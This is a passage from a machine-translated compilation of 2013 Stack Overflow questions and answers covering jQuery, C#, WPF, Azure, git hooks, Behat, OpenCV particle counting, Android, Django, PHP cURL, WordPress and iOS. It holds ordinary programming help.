<div id='guardan' style="display:<?= $mostrar?>">
    <input type="button" value="Guardar" onclick="modifica('anosAntiguedad')" />
</div>

<input type="radio" name="viveCasa" id="viveCasa" value="Propia" >Propia
<input type="radio" name="viveCasa" id="viveCasa" value="Rentada" >Rentada
<input type="radio" name="viveCasa" id="viveCasa" value="Familiares" >Familiares

<div id='guardan' >
    <input type="button" value="Guardar" onclick="modifica('viveCasa')" />
</div> 
```

我已经有了输入文本所需的行为，并且我已经使用 jQuery 在每个文本的更改上激活了相应的保存按钮。像这样：

```
$('input:text')
        .bind('change ',function(){ 
            $(this).next("div").children(":button")
                .attr("disabled",false);        
    }); 
```

但是，如果我使用初始 $(":radio") 选择器执行类似操作，它不会按预期工作，因为它仅在组中的 LAST 收音机发生更改时才激活保存按钮（因为我使用 .next ）。此外，如果我使用 .siblings 而不是 .next，我会在页面中获得所有带有按钮的 div，因为它们都具有与输入（收音机和文本）相同的父级。我想在每个收音机组之后获取按钮的 div，而不仅仅是在最后一个收音机之后。

为了更清楚，请参考[this fiddle](http://jsfiddle.net/64mqU/)

笔记：

*   我正在使用 jQuery 1.3，所以这就是为什么我使用 attr() 而不是 prop() 哟更改 disabled 属性。
*   我不能更改 html 代码，只能更改 jQuery 代码，因此更改 html 中的任何内容都不可行。另外，还有更多的无线电组，带有其他文本输入的 amog（每个都有一个保存按钮）
*   我知道每个 div 都具有相同的“guardan”id 是一个错误，但同样，这就是代码的方式，我无法更改它。

包起来。当收音机改变时，我需要一种方法来为每个单选按钮组启用相应的保存按钮。保存按钮总是包裹在 div 中，并且 div 总是在收音机或文本输入之后。我需要它在 jQuery 中工作，最好是 1.3，但如果需要，我可以将它更改为更新的版本。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:56:59.587

Use [`.nextAll()`](http://api.jquery.com/nextAll/) , with a `div:first` filter, like this:

```
 $('input:radio')
        .bind('change ',function(){ 
            $(this).nextAll("div:first").children(":button")
                .attr("disabled",false);        
    }); 
```

See [**working fiddle**](http://jsfiddle.net/64mqU/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:06:15.733

这可以优化，但是：

```
$(":radio").change(function(){
    var nextButton = function($but) { 
        if ($but.next().is('DIV')) {
            $but.next().find(":button").attr("disabled",false);
        } else {
            nextButton($but.next());
        }

    }
    nextButton($(this));
}); 
```

# c# - 文件已打开，但不确定何时关闭

> ID：16110627
> 
> 赞同：1
> 
> 时间：2013-04-19T17:49:36.783
> 
> 标签：c#

这是我的代码片段：

```
System.IO.File.Copy(templatePath, outputPath, true);

using(var output = WordprocessingDocument.Open(outputPath, true))
{
    Body updatedBodyContent = new Body(newWordContent.DocumentElement.InnerXml);
    output.MainDocumentPart.Document.Body = updatedBodyContent;
    output.MainDocumentPart.Document.Save();
    response.Content = new StreamContent(
        new FileStream(outputPath, FileMode.Open, FileAccess.Read));

    response.Content.Headers.ContentDisposition =
        new System.Net.Http.Headers.ContentDispositionHeaderValue("attachment");
    response.Content.Headers.ContentDisposition.FileName = outputPath;
} 
```

outputPath 位置中的文件最初不存在。它在第 1 行创建。在第 8 行它中断 - 它说文件正在被使用。

我不是错误所在。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:55:24.017

在尝试打开文件之前，您需要完成`WordprocessingDocument`并让它关闭。这应该有效：

```
System.IO.File.Copy(templatePath, outputPath, true);

using (WordprocessingDocument output = 
       WordprocessingDocument.Open(outputPath, true))
{
    Body updatedBodyContent = 
        new Body(newWordContent.DocumentElement.InnerXml);
    output.MainDocumentPart.Document.Body = updatedBodyContent;
    output.MainDocumentPart.Document.Save();
}
response.Content = new StreamContent(new FileStream(outputPath, 
                                                    FileMode.Open, 
                                                    FileAccess.Read));
response.Content.Headers.ContentDisposition = 
    new System.Net.Http.Headers.ContentDispositionHeaderValue("attachment");

response.Content.Headers.ContentDisposition.FileName = outputPath; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T17:55:44.840

You are getting an error because the process which is writing to the file has an exclusive lock on it. You need to close `output` prior to trying to open it. Your second param in the `Open` call is saying you're opening for editing, apparently that is locking the file. You could move that code outside of the using statement which will automatically dispose of the lock.

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-19T17:56:10.473

At line 3, you open the file to edit

```
WordprocessingDocument.Open(outputPath, true) 
```

But at line 8, you try to open it again

```
new FileStream(outputPath, FileMode.Open, FileAccess.Read) 
```

You can close your `using` before setting your response headers.

# c# - TextBlock + RichTextBox 到剪贴板

> ID：16110631
> 
> 赞同：0
> 
> 时间：2013-04-19T17:49:51.817
> 
> 标签：c#, wpf

我正在尝试将动态创建的 TextBlock 和动态创建的 RichTextboxes（它们并排放置）的内容放入 c# + wpf 中的剪贴板，但是，我无法这样做。我在谷歌上搜索无济于事，我想出的最新代码是

```
StringBuilder clipboard = new StringBuilder();
        String rtb = scrlPanel.Children.OfType<RichTextBox>().ToString();
        //List<RichTextBox> rtb = scrlPanel.Children.OfType<RichTextBox>().;

        foreach(TextBlock txtb in scrlPanel.Children.OfType<TextBlock>())
        {
            clipboard.Append(txtb.Text + " " + "::" + Environment.NewLine + rtb.ToString() + Environment.NewLine);

        }
        Clipboard.SetText(clipboard.ToString()); 
```

但它不起作用，代码复制 TextBlocks 就好了，但 RichTextBoxes 内容显示“System.Linq.Enumerable+d__aa`1[System.Windows.Controls.RichTextBox]”

非常感谢任何帮助或指示。

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:57:09.170

您正在从 ToString() 复制 - 方法，该方法默认显示类型名。

你应该这样做：

StringBuilder 剪贴板 = new StringBuilder();

```
 List<RichTextBox> rtbs = scrlPanel.Children.OfType<RichTextBox>().ToList();
    List<TextBlock> texts = scrlPanel.Children.OfType<TextBlock>().ToList();

    foreach(TextBlock txtb in texts)
    {
        RichTextBox rtb = rtbs[texts.indexOf(txtb)];
        string rtbtext = new TextRange(rtb .Document.ContentStart, rtb .Document.ContentEnd).Text; 
        clipboard.Append(txtb.Text + " " + "::" + Environment.NewLine + rtbtext + Environment.NewLine);

    }
    Clipboard.SetText(clipboard.ToString()); 
```

也就是说，如果您的 TextBoxes 与 RichTextBoxes 一样多，并且它们具有相同的顺序。

PD：可能有更好的方法来做到这一点，但这将是一个快速的解决方案。

# google-plus - 网站上的 Google+ 徽章

> ID：16110638
> 
> 赞同：2
> 
> 时间：2013-04-19T17:50:25.543
> 
> 标签：google-plus, google-sites, badge

我正在尝试在我最近创建的网站[sites.google.com](http://sites.google.com)上放置一个 Google+ 徽章。当我复制代码并将其粘贴到 HTML 框中时，实际上没有任何反应。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T15:00:54.307

您可以使用自定义小工具将 Google+ 徽章插入您的 Google 协作平台页面：

1.  获取您的 Google+ 个人资料 ID，您可以从个人资料的 URL 中获取该 ID。ID 将`123456789012345678901`用于此 URL：`https://plus.google.com/123456789012345678901/`或`+LarryPage`用于此 URL：`https://plus.google.com/+LarryPage/`
2.  编辑要添加徽章的页面
3.  选择**插入**-> **...更多小工具...**
4.  搜索 G+ 徽章。
5.  将您的个人资料 ID 粘贴到 G+ ID 字段中。
6.  根据需要为您的页面配置其他选项。您可能需要调整小工具容器的尺寸以使徽章在您的网站中正常工作。

小工具有局限性，这可能无法完美运行，但它可能是在您的页面上获得徽章的最佳方式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T21:24:35.397

您可以在[https://developers.google.com/+/web/badge/](https://developers.google.com/+/web/badge/)找到 Google+ 徽章的配置工具。

关键点是您需要将 HTML 添加为小部件并包含 JavaScript 标记——它与加载我们的任何 Google+ 属性的 JavaScript 相同。

去年我还制作了一个 3 分钟的视频来解释这些步骤，您可以在[http://www.youtube.com/watch?v=wLG4IIIPgnc](http://www.youtube.com/watch?v=wLG4IIIPgnc)观看。

# azure - 内容如何在多实例 Azure 网站中传播

> ID：16110640
> 
> 赞同：0
> 
> 时间：2013-04-19T17:50:32.730
> 
> 标签：azure

我有一个要部署到 Azure 网站的 WordPress 网站。好奇如果我使用多个实例，当用户上传内容时会发生什么？内容会自动传播吗？我在 Azure 文档中找不到任何关于它的内容。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T04:04:15.593

实际上，Azure 网站使用单个共享位置来存储内容，因此更新将反映在所有实例上，因为它们已上传到同一位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T19:57:38.597

对 Azure 网站 HD 所做的任何更新都应视为临时更新。在去年的 BUILD 中，据说每个实例都将获得“原始”blob 存储的副本，因此对一个实例的任何更新都不会传播给其他实例。当然，Azure 的大部分内部工作都没有公布，所以从那时起这可能已经改变了。有一个不错的 WordPress 插件，可以将上传的媒体存储到您的 Windows Azure 博客存储帐户[http://wordpress.org/extend/plugins/windows-azure-storage/](http://wordpress.org/extend/plugins/windows-azure-storage/) 可以在此处找到用户手册： [http://plugins。 svn.wordpress.org/windows-azure-storage/trunk/UserGuide.pdf](http://plugins.svn.wordpress.org/windows-azure-storage/trunk/UserGuide.pdf)

# git - Git Post-receive 部署很慢

> ID：16110642
> 
> 赞同：1
> 
> 时间：2013-04-19T17:50:44.007
> 
> 标签：git, githooks, git-post-receive

我们正在用我们的网站测试 git 版本控制。当前设置在网络共享驱动器 /g/ 上有两个裸存储库（一个用于 Intranet，一个用于 Internet）。当推送到这个存储库时，我希望网站自动签出到 /x/ 的网络服务器。根据这里几个博客和问题的建议，我设置了一个post-receive hook，如下：

```
#!/bin/sh
GIT_WORK_TREE=/x/intranet checkout -f 
```

这对于部署每个存储库的主分支非常有效。每次部署可能需要 5-10 秒。但是，我们还希望有一个自动签出到 /y/ 的开发服务器的 dev 分支。我修改后的钩子看起来像这样：

```
#!/bin/sh
GIT_WORK_TREE=/x/intranet checkout -f master
GIT_WORK_TREE=/y/intranet checkout -f dev 
```

这是非常有问题的，因为现在推送大约需要 15 分钟。问题似乎是每个分支的整个工作目录都被重写了，而不是仅仅更新任何已更改的文件。即使添加了一个条件来检查哪个分支被推送并且只签出那个分支，如果我推送了之前推送的分支以外的分支，推送仍然需要大约 10 分钟。显然这是不可接受的。

我目前的尝试在每台服务器上都有 2 个存储库（一个 Intranet 和一个 Internet）。我现在运行的钩子如下所示：

```
#!/bin/bash

while read oldrev newrev ref
do
  branch=`echo $ref | cut -d/ -f3`

  if [ "master" == "$branch" ]; then
    cd /x/intranet
    unset GIT_DIR
    git pull --verbose origin master
    echo "Changes pushed to production server."
  fi

  if [ "dev" == "$branch" ]; then
    cd /y/intranet
    unset GIT_DIR
    git pull --verbose origin dev
    echo "Changes pushed to dev server."
  fi

done 
```

这个钩子仍然比我认为它应该运行的时间更长（几乎 2 分钟，而我自己运行一个 repos 大约需要 4 秒）。我的任何一个实现都有问题吗？还是有另一种方法可以解决这个问题？

编辑：我想知道在 git bash shell 中使用已安装的驱动器是否可能是问题所在？

# php - Gherkin + Behat 场景大纲抛出 Behat\Gherkin\Exception\ParserException

> ID：16110645
> 
> 赞同：9
> 
> 时间：2013-04-19T17:50:53.983
> 
> 标签：php, behat, gherkin

我正在尝试运行注册示例，但我卡住了

```
Scenario: New user registration; poor password
  Given I am on "/register"
  When I fill in "username" with "admin"
  And I fill in "password1" with "<pw>"
  And I fill in "password2" with "<pw>"
  And I press "Login"
  Then I should be on "/register"
  And I should see an "pwError" element

  Examples:
    |  pw   |
    |  12   |
    |  20   | 
```

然后我收到以下错误：

> [Behat\Gherkin\Exception\ParserException] 预期的注释或场景或大纲或步骤标记，但得到了示例

我究竟做错了什么？我在 behat doc 上找不到任何帮助。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-04-21T06:53:55.180

对于示例，您必须使用“场景大纲”而不是“场景”。

# python - 在 python 中使用图像处理计数粒子

> ID：16110649
> 
> 赞同：10
> 
> 时间：2013-04-19T17:51:16.400
> 
> 标签：python, image, opencv, python-imaging-library

有没有什么好的算法可以检测背景强度变化的粒子？例如，如果我有以下图像：

![荧光](https://i.imgur.com/xnZogXS.jpg)

有没有办法计算小的白色颗粒，即使左下方出现明显不同的背景？

为了更清楚一点，我想标记图像并使用发现这些粒子显着的算法对粒子进行计数：

![标记粒子](https://imgur.com/6ZmuYQS.jpg)

我用`PIL`, `cv`, `scipy`,`numpy`等模块尝试了很多东西。我从[这个非常相似的 SO question](https://stackoverflow.com/questions/14777545/detect-object-with-opencv-and-python)中得到了一些提示，乍一看，您可以采用这样的简单阈值：

```
im = mahotas.imread('particles.jpg')
T = mahotas.thresholding.otsu(im)

labeled, nr_objects = ndimage.label(im>T)
print nr_objects
pylab.imshow(labeled) 
```

但由于不断变化的背景，你会得到这个： ![bad_threshold_image](https://imgur.com/Gh1GtpX.jpg)

我还尝试了其他想法，例如[我发现的一种用于测量 paws 的技术](https://stackoverflow.com/questions/3684484/peak-detection-in-a-2d-array)，我以这种方式实现了它：

```
import numpy as np
import scipy
import pylab
import pymorph
import mahotas
from scipy import ndimage
import cv

def detect_peaks(image):
    """
    Takes an image and detect the peaks usingthe local maximum filter.
    Returns a boolean mask of the peaks (i.e. 1 when
    the pixel's value is the neighborhood maximum, 0 otherwise)
    """

    # define an 8-connected neighborhood
    neighborhood = ndimage.morphology.generate_binary_structure(2,2)

    #apply the local maximum filter; all pixel of maximal value 
    #in their neighborhood are set to 1
    local_max = ndimage.filters.maximum_filter(image, footprint=neighborhood)==image
    #local_max is a mask that contains the peaks we are 
    #looking for, but also the background.
    #In order to isolate the peaks we must remove the background from the mask.

    #we create the mask of the background
    background = (image==0)

    #a little technicality: we must erode the background in order to 
    #successfully subtract it form local_max, otherwise a line will 
    #appear along the background border (artifact of the local maximum filter)
    eroded_background = ndimage.morphology.binary_erosion(background, structure=neighborhood, border_value=1)

    #we obtain the final mask, containing only peaks, 
    #by removing the background from the local_max mask
    detected_peaks = local_max - eroded_background

    return detected_peaks

im = mahotas.imread('particles.jpg')
imf = ndimage.gaussian_filter(im, 3)
#rmax = pymorph.regmax(imf)
detected_peaks = detect_peaks(imf)
pylab.imshow(pymorph.overlay(im, detected_peaks))
pylab.show() 
```

但这也没有运气，显示了这个结果：

![bad_result_from_detect_peaks](https://imgur.com/vjXVuLZ.jpg)

使用区域最大函数，我得到的图像几乎似乎给出了正确的粒子识别，但是根据我的高斯滤波，错误位置的粒子太多或太少（图像的高斯滤波器为 2,3，& 4):

![2的高斯](https://i.imgur.com/YpVFjeV.jpg) ![3的高斯](https://i.imgur.com/f4bxwp1.jpg) ![4的高斯](https://i.imgur.com/PSHSiHP.jpg)

此外，它还需要处理与此类似的图像：

![荧光](https://i.imgur.com/rkV3qEo.jpg)

这是上面相同类型的图像，只是粒子密度更高。

***编辑：已解决的解决方案：*** 我能够使用以下代码为这个问题找到一个不错的工作解决方案：

```
import cv2
import pylab
from scipy import ndimage

im = cv2.imread('particles.jpg')
pylab.figure(0)
pylab.imshow(im)

gray = cv2.cvtColor(im, cv2.COLOR_BGR2GRAY)
gray = cv2.GaussianBlur(gray, (5,5), 0)
maxValue = 255
adaptiveMethod = cv2.ADAPTIVE_THRESH_GAUSSIAN_C#cv2.ADAPTIVE_THRESH_MEAN_C #cv2.ADAPTIVE_THRESH_GAUSSIAN_C
thresholdType = cv2.THRESH_BINARY#cv2.THRESH_BINARY #cv2.THRESH_BINARY_INV
blockSize = 5 #odd number like 3,5,7,9,11
C = -3 # constant to be subtracted
im_thresholded = cv2.adaptiveThreshold(gray, maxValue, adaptiveMethod, thresholdType, blockSize, C) 
labelarray, particle_count = ndimage.measurements.label(im_thresholded)
print particle_count
pylab.figure(1)
pylab.imshow(im_thresholded)
pylab.show() 
```

这将显示如下图像：

![粒子给定](https://i.imgur.com/xnZogXS.jpg) （这是给定的图像）

和

![counted_pa​​rticles](https://imgur.com/AjXdi6i.jpg)

（这是计数的粒子）

并计算粒子数为 60。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-22T18:39:27.710

我通过使用一种称为自适应对比度的技术调整差异阈值解决了“背景中的可变亮度”。它通过执行灰度图像与自身模糊版本的线性组合（在这种情况下为差异），然后对其应用阈值来工作。

1.  使用合适的统计算子对图像进行卷积。
2.  从卷积图像中减去原始图像，必要时校正强度比例/伽玛。
3.  用常数对差异图像进行阈值处理。

（[原纸](http://www.cvmt.dk/education/teaching/f10/MED8/CV/Stud/832.pdf)）

我`scipy.ndimage`在浮点域中非常成功地做到了这一点（比整数图像处理更好的结果），如下所示：

```
original_grayscale = numpy.asarray(some_PIL_image.convert('L'), dtype=float)
blurred_grayscale = scipy.ndimage.filters.gaussian_filter(original_grayscale, blur_parameter)
difference_image = original_grayscale - (multiplier * blurred_grayscale);
image_to_be_labeled = ((difference_image > threshold) * 255).astype('uint8')  # not sure if it is necessary

labelarray, particle_count = scipy.ndimage.measurements.label(image_to_be_labeled) 
```

希望这可以帮助！！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-20T15:48:37.893

我真的不能给出一个明确的答案，但这里有几个指针：

1.  该函数`mahotas.morph.regmax`可能比最大滤波器更好，因为它消除了伪最大值。也许将其与全局阈值、局部阈值（例如窗口上的平均值）或两者结合起来。

2.  如果您有多个图像和相同的不均匀背景，那么也许您可以计算平均背景并对其进行归一化，或者使用空图像作为背景估计。如果你有一台显微镜，就会出现这种情况，就像我见过的每台显微镜一样，照明是不均匀的。

就像是：

```
average = average_of_many(images)
# smooth it
average = mahotas.gaussian_filter(average,24) 
```

现在您对图像进行预处理，例如：

```
preproc = image/average 
```

或类似的东西。

# android - SetImageBitmap 在 Android 中不起作用

> ID：16110650
> 
> 赞同：3
> 
> 时间：2013-04-19T17:51:25.837
> 
> 标签：android, image

我正在为 Android 开发一个应用程序，我正在使用 Gallery 小部件，并且我已将其调整为全屏模式，因此它一次显示一个图像。

```
<com.example.librosapp.MyGallery 
        android:id="@+id/examplegallery" android:layout_width="1920px"
        android:layout_height="1020px"
        android:padding="0px"
        android:layout_marginTop="-20px"
        /> 
```

这是我的活动代码的一部分：

```
public View getView(int position, View convertView, ViewGroup parent) {
        ImageView imgView = new ImageView(cont);

        //Here are my changes:
        File imgFile = new  File("sdcard/Libreria/0/0/0.JPG");
        if(imgFile.exists()){
            Bitmap myBitmap = BitmapFactory.decodeFile(imgFile.getAbsolutePath());
            //The app runs OK til here:
            imgView.setImageBitmap(myBitmap);
            //BOOM! Exception
        }           

        imgView.setLayoutParams(new MyGallery.LayoutParams(1950, 1000));
        imgView.setScaleType(ImageView.ScaleType.FIT_XY);

        return imgView;
    } 
```

我不知道我得到了哪个异常，因为我无法在这里调试，我在我的设备中使用 .APK。（我必须调试这个的唯一方法是使用虚拟设备，我不知道为什么它运行得非常慢。

**我做错了吗？，如果我使用相同的图像，该代码可以完美运行，但作为项目资源（使用 setImageDrawable）**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-19T22:47:48.277

发生这种情况是因为`myBitMap`为空。 `myBitMap`为空，因为文件路径无效。我的猜测是文件路径应该是`/sdcard/Libreria/0/0/0.JPG`

# cufon - 与 removeClass 事件一起使用时出现 Cufon.refresh() 问题

> ID：16110654
> 
> 赞同：1
> 
> 时间：2013-04-19T17:51:45.240
> 
> 标签：cufon, removeclass

我需要一些帮助。

我在我正在处理的网站上使用 Cufon 自定义字体。我在顶部链接上应用了 Cufon 字体。到目前为止一切正常。

这是我的问题：当我正在制作一个响应式网站时，我希望在将窗口大小调整为小于 767px 宽的屏幕尺寸后，字体从自定义 Cufon 更改为常规字体。

为此，我正在使用该`removeClass`事件：

```
<script>    
if ( $(window).width() < 767) {
$('li').removeClass('newFont');
}
</script> 
```

问题是在刷新页面之前，Cufon 字体不会被替换。

我尝试过`Cufon.refresh()`这样的事件：

```
<script>    
if ( $(window).width() < 767) {
$('li').removeClass('newFont');
Cufon.refresh();
}
</script> 
```

但这也不起作用，在我手动刷新页面之前，字体不会被替换。

任何帮助将非常感激。

先感谢您。

# android - 从 doInBackground 返回多个值

> ID：16110657
> 
> 赞同：-4
> 
> 时间：2013-04-19T17:51:52.423
> 
> 标签：android, android-asynctask, jsoup

如何返回从本网站获得的多个链接？我在循环之外的回报似乎不起作用。

```
public class jsoupexample extends AsyncTask<String,Integer,String>{
    @Override
    protected String doInBackground(String... html) {
        try {
            doc = Jsoup.connect(html[0]).get();
        } catch (IOException e) {
            e.printStackTrace();
        }
        Elements link = doc.select("a[href]");

        for(Element links : link) {
            audi=links.attr("abs:href");
        }
        return audi;
    }

    @Override
    protected void onPostExecute(String result) {
        super.onPostExecute(result);
        tv2.setText(result);
    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:08:58.803

您必须尝试使用​​ for 循环获取所有这些值并将它们收集到列表或字符串数​​组对象中，然后在**doInBackground**中返回该对象，以便您以后可以在**onPostExecute**中使用。

使用[AsyncTask：doInBackground()的返回值去哪了？](https://stackoverflow.com/questions/4489399/asynctask-where-return-value-of-doinbackground-goes)寻求更多帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:57:44.557

尝试这个

只需添加加号即可连接这样的值

```
 for(Element links : link) {
            audi+=links.attr("abs:href");
        } 
```

# django - 安装 photologue 后出现 Django ViewDoesNotExist 错误

> ID：16110659
> 
> 赞同：2
> 
> 时间：2013-04-19T17:51:54.087
> 
> 标签：django, django-views, photologue

我正在使用 Django 1.5.1。一切都很好。但是一旦我通过 pip 安装了 django-photologue，当我访问管理 url 时就会遇到这个错误：

```
> **ViewDoesNotExist at /admin/**  
Could not import django.views.generic.list_detail.object_list. Parent module django.views.generic.list_detail does not exist.  
Request Method: GET  
Request URL:    http://localhost:8000/admin/  
Django Version: 1.5.1  
Exception Type: ViewDoesNotExist  
Exception Value:      
Could not import django.views.generic.list_detail.object_list. Parent module   django.views.generic.list_detail does not exist.  
Exception Location: /usr/local/lib/python2.7/dist-packages/django/core/urlresolvers.py in get_callable, line 104  
Python Executable:  /usr/bin/python  
Python Version: 2.7.3 
```

此外，当我运行 syncdb 时，photologue 与数据库同步没有任何错误，我可以将其导入 shell。

关于如何解决此错误的任何想法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-29T13:02:09.793

替换目录 urls.py photologue 中的文件：

```
"django.views.generic.date_based" and "django.views.generic.list_detail" on "django.views.generic" 

"object_list" on "list.ListView"
"object_detail" on "detail.DetailView"
"archive_year" on "dates.YearArchiveView"
"archive_month" on "dates.MonthArchiveView"
"archive_day" on "dates.DayArchiveView" 
```

像这样 ：）

或阅读：

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T08:47:41.273

django-photologue 很可能是为旧版本的 Django 构建的。看起来新版本的 Django 对通用视图不友好，而是更喜欢基于类的视图。

下载新副本`Django 1.5.1`显示以下内容：http: [//f.cl.ly/items/0k1J261S2J2f3k3C110I/Image%202013.04.20%203%3A44%3A39%20AM.png](http://f.cl.ly/items/0k1J261S2J2f3k3C110I/Image%202013.04.20%203%3A44%3A39%20AM.png)

而`Django 1.4.2`显示： http: [//f.cl.ly/items/152J2U050X0z1j1n0v0D/Image%202013.04.20%203%3A46%3A49%20AM.png](http://f.cl.ly/items/152J2U050X0z1j1n0v0D/Image%202013.04.20%203%3A46%3A49%20AM.png)

简单地说，新版本的 Django**删除**了该`list_detail`文件。

# php - PHP str_replace 与关联数组

> ID：16110661
> 
> 赞同：0
> 
> 时间：2013-04-19T17:51:55.673
> 
> 标签：php

我有一行从 DB 返回，我需要将 cols 中使用的特定标记字符更改为显示的正确字符：

```
$row = mysqli_fetch_array($res, MYSQLI_ASSOC); //the result of query is 1 row

$markup = array("@", "#", "&", "$"); // this is our markup
$meaning   = array("↑", "↓", "(dil.)", "(conc.)"); // this is our meaning of the markup for the display

foreach ($row as $k => $v) { //for each element of the array we change one char for the other
$v = str_replace ($markup, $meaning, $v);
echo "<br>$v";

} 
```

UPD 现在变得越来越奇怪了。如果在对数组进行更改之前跟踪 str_replace，我犯了一个错误，我修复了它，蚂蚁跟踪表明它有效！但是下面有这个数组的特殊输出，它仍然出现未替换的字符！

```
 $reagent_no = "reaction_l" . $i; // determining the column number, irrelevant to the issue
    echo "<td>\n<h3>{$row[$reagent_no]}</h3></td>"; //output of the supposedly 
//changed characters, but it still outputs the markup, as if i didnt do anything to the array previously 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:56:51.507

You are first printing the variable and then using the str_replace() function. Change it to:-

```
foreach ($row as $k => $v) { //for each element of the array we change one char for the other
$v = str_replace ($markup, $meaning, $v);
echo "<br>$v";
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T18:01:10.647

问题是`str_replace`在`echo`.

尝试：

```
foreach ($row as $k => $v) { //for each element of the array we change one char for the other
    $v = str_replace ($markup, $meaning, $v);
    echo "<br>$v";
} 
```

# php - 多个请求的 PHP cURL total_time 慢

> ID：16110662
> 
> 赞同：0
> 
> 时间：2013-04-19T17:51:55.860
> 
> 标签：php, curl

我正在从 PHP 连续运行多个 cURL 请求。我运行请求的代码如下所示：

```
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Content-Type: application/json')
);
curl_exec($ch);
error_log("curl info: " . print_r(curl_getinfo($ch), true));
curl_close($ch); 
```

第一个请求一切正常。来自的数据`curl_getinfo`如下所示：

```
[url] => http://XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[content_type] => text/html; charset=UTF-8
[http_code] => 201
[header_size] => 492
[request_size] => 145
[filetime] => -1
[ssl_verify_result] => 0
[redirect_count] => 0
[total_time] => 0.336019
[namelookup_time] => 0.140008
[connect_time] => 0.17601
[pretransfer_time] => 0.17601
[size_upload] => 2632
[size_download] => 178
[speed_download] => 529
[speed_upload] => 7832
[download_content_length] => 178
[upload_content_length] => 2632
[starttransfer_time] => 0.212012
[redirect_time] => 0 
```

但是，第二个请求大约需要三秒钟。这反映在 中`total_time`，但所有单独的时间值都很小：

```
[url] => http://XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[content_type] => text/html; charset=UTF-8
[http_code] => 201
[header_size] => 492
[request_size] => 145
[filetime] => -1
[ssl_verify_result] => 0
[redirect_count] => 0
[total_time] => 3.572204
[namelookup_time] => 0
[connect_time] => 0.036002
[pretransfer_time] => 0.036002
[size_upload] => 2632
[size_download] => 178
[speed_download] => 49
[speed_upload] => 736
[download_content_length] => 178
[upload_content_length] => 2632
[starttransfer_time] => 0.068004
[redirect_time] => 0 
```

`total_time`即使连接和传输发生得很快，是什么导致如此长的？我还在服务器上记录了这个请求的时间（使用 error_log 和 PHP），直到我在客户端调用 curl_exec 后 3 秒才看到请求的开始。这是来自客户端的我的 PHP 和 cURL 版本信息：

```
$php -v
PHP 5.2.4-2ubuntu5.14 with Suhosin-Patch 0.9.6.2 (cli) (built: Jan 12 2011 15:54:52)
$curl -V
curl 7.18.0 (x86_64-pc-linux-gnu) libcurl/7.18.0 OpenSSL/0.9.8g zlib/1.2.3.3 libidn/1.1
Protocols: tftp ftp telnet dict ldap ldaps http file https ftps
Features: GSS-Negotiate IDN IPv6 Largefile NTLM SSL libz 
```

# javascript - WordPress中单页的自定义Js

> ID：16110664
> 
> 赞同：1
> 
> 时间：2013-04-19T17:51:56.423
> 
> 标签：javascript, jquery

我正在尝试找到一个纯java脚本解决方案； [http://jsfiddle.net/IMAGINEUX/AQrNs/1/](http://jsfiddle.net/IMAGINEUX/AQrNs/1/)

我希望它在 DOMready 就绪后触发：

```
 $('#menu-item-156').mouseover(function(){
$(this).find('ul').slideDown(); 
```

});

$('#menu-item-156').trigger('mouseover');

谢谢，

马特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:10:45.017

您可以像@Sunyatasattva 提到的那样在单页类前面添加它，或者您可以仅在需要使用它的页面上将该脚本排入队列。

**函数.php**

```
function enqueue_scripts() {
    wp_register_script( 'dropdown', get_template_directory_uri() . '/lib/js/dropdown.js', array( 'jquery' ), 1.0, true );

    if ( is_page( 156 ) ) :
        wp_enqueue_script( 'dropdown' );
    endif;

}

add_action( 'wp_enqueue_scripts', 'enqueue_scripts' ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:55:19.280

只需在您的 jQuery 选择器前面加上`body`由 Wordpress 分配给该元素的页面类，例如：

```
$('.my-page #menu-item-156').mouseover(function(){
     $(this).find('ul').slideDown();
});

$('#menu-item-156').trigger('mouseover'); 
```

这将确保 Javascript 仅在所需页面上触发。

# ios - 带有平移手势和按下方法的 UIButton

> ID：16110665
> 
> 赞同：1
> 
> 时间：2013-04-19T17:52:00.653
> 
> 标签：ios, objective-c, uigesturerecognizer

我想提供`UIButton`不同的功能，具体取决于它是按下并释放一次，还是按住（理想情况下为 1.5 秒）并在屏幕上移动。我目前正在使用此代码：

```
 [button addTarget:self action:@selector(open:)
     forControlEvents:UIControlEventTouchDown]

    panRecognizer = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(move:)];
    [panRecognizer setMinimumNumberOfTouches:1];
    [panRecognizer setMaximumNumberOfTouches:1];
    [panRecognizer setDelegate:self];
    [button addGestureRecognizer:panRecognizer];

-(IBAction)open:(id)sender {}

-(void)move:(id)sender{} 
```

`move:`工作正常，但`open:`没有。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-06T21:09:35.133

我这样做了，让我知道它是否适合您：

```
- (void)viewDidLoad
{
    [super viewDidLoad];

